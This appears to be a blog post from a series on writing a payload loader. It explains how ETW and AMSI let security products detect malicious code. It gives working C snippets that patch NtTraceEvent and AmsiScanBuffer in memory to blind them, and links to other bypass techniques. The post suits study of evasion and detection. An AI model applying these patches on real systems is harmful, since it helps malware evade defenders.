In the last post, we discussed how we can get rid of any hooks placed into our process by an EDR solution. However, there are also other mechanisms provided by Windows, which could help to detect our payload. Two of these are ETW and AMSI. 

## Disclaimer
These posts are done as a reference for myself and to gain a deeper understanding of the discussed topics by explaining them in a blog post. 

The techniques used here are not novel and were documented by other people before. Therefore the use of these posts for threat actors will likely be minimal. Nonetheless, I decided against releasing a full PoC implementation and will instead only provide code snippets as part of the posts. All of the credit should go to the people, that did the original research on the techniques used. 

## Background

### ETW
Event Tracing for Windows collects events from a process, which can then be retrieved e.g. by an EDR or AV solution. This could allow the detection of our payload. An article, that discusses more details can be found [here](https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/). An easy way to see the effect of patching ETW is using the process hacker after loading a C# assembly. The following screenshot was taken without patching ETW:

As we can see it is possible to see, that Rubeus was loaded into our process. If the Process Hacker is aware of this, then an EDR can also detect this. The next screenshot shows the same window, but this time ETW was patched before the C# assembly was loaded:

As we can see there is no information about the loaded assemblies available.

### AMSI
AMSI is another feature provided by Microsoft. Here an EDR or AV solution can register as a provider and will then get handed e.g. C# assemblies or PowerShell scripts before they are executed. This is done automatically e.g. while loading a C# assembly. Our payload would be unencrypted at this point and could therefore be detected. 

As both ETW and AMSI are implemented in user space we can interfere with them from user space. Note, however, that attacking these features might in itself lead to detection and therefore this is a place where it might make sense to use more creative solutions than done in this post.

## Patching functions
Similar to the hooks placed by EDRs we can simply modify functions, that are needed for ETW or AMSI.  Note that both locations at which I am currently patching functions are well-known and likely detected by at least some EDRs.

### ETW
For ETW the `NtTraceEvent` syscall is used to turn over this information to the kernel from which it can be later retrieved. Therefore patching this syscall in `ntdll.dll` so that it does not hand over the information should disable the feature. There are also other functions related to ETW, but the `NtTaceEvent` function seems to be central to the functionality of ETW and therefore a good option. A PoC can be found [here](https://gist.github.com/xpn/fabc89c6dc52e038592f3fb9d1374673). The implementation in my loader looks as follows:
```
// Get a handle to ntdll
HANDLE ntdll_handle = GetModuleHandle("ntdll.dll");

// Get the address of NtTraceEvent
LPVOID nttraceevent_address = GetProcAddress(ntdll_handle, "NtTraceEvent");

// We need a copy as ntprotectvirtualmemory might overwrite our address
LPVOID nttraceevent_address_copy = nttraceevent_address;

// Change the protections of the function so we can write
DWORD oldprotect = 0;
SIZE_T size = 4096;
pNtProtectVirtualMemory((HANDLE)-1, &nttraceevent_address_copy, &size, PAGE_EXECUTE_READWRITE, &oldprotect);

// Write a return opcode at offset 3
memcpy(nttraceevent_address+3, "\xc3", 1); // ret

// Change the protections back to the original ones
pNtProtectVirtualMemory((HANDLE)-1, &nttraceevent_address, &size, PAGE_EXECUTE_READ,&oldprotect);
```

### AMSI 
For AMSI we can patch for example the `AmsiScanBuffer` function.  The implementation currently looks very similar to the one for ETW, but we additionally need to ensure, that `amsi.dll` is loaded:
```
// Get a handle to amsi.dll
HMODULE amsi_handle = LoadLibraryA("amsi.dll");

// Get the address of the AmsiScanBuffer function
LPVOID amsiscanbuffer_address = GetProcAddress(amsi_handle, "AmsiScanBuffer");

// We need a copy as ntprotectvirtualmemory might overwrite our address
LPVOID amsiscanbuffer_address_copy = amsiscanbuffer_address;

// Change the protections of the function so we can write
DWORD oldprotect = 0;
SIZE_T size = 4096;
NtProtectVirtualMemory((HANDLE)-1, &amsiscanbuffer_address_copy, &size, PAGE_READWRITE,&oldprotect);

// Write a return opcode at offset 3
memcpy(amsiscanbuffer_address+3, "\xc3", 1); // ret

// Change the protections back to the original ones
NtProtectVirtualMemory((HANDLE)-1, &amsiscanbuffer_address, &size, oldprotect,&oldprotect);
```

In my opinion, this is pretty suspicious, as we are forcing a load of `amsi.dll` at a point where it is not needed. A better strategy would be to invoke legit functionality, which causes `amsi.dll` to be loaded, and to then patch it after it was loaded.

## Vectored Exception Handling
There is a blog post [here](https://ethicalchaos.dev/2022/04/17/in-process-patchless-amsi-bypass/) by [EthicalChaos](https://twitter.com/_EthicalChaos_), which discusses evading AMSI without making changes to the functions is memory. This works by setting a hardware breakpoint on the previously discussed functions and then using a Vectored Exception Handler to handle this hardware breakpoint. Our exception handler can then force the function to return and specify a return value indicating, that everything went well. An implementation can be found [here](https://gist.github.com/CCob/fe3b63d80890fafeca982f76c8a3efdf).

## Library Loads (AMSI)
Another idea for disabling AMSI is to prevent `amsi.dll` from being loaded. This could e.g. be done by adding a hook to `LdrLoadDll` in `ntdll.dll` to filter the DLLs we allow our process to load. This is done by [batsec](https://twitter.com/_batsec_) [here](https://gist.github.com/bats3c/59932dfa1f5bb23dd36071119b91af0f).

## Summary
In this post, we took a look at disabling ETW and AMSI for our process, which is especially relevant for loading C# executables. In the next post, we will finally be discussing how to load our actual payload and how well the loader fares against security products.
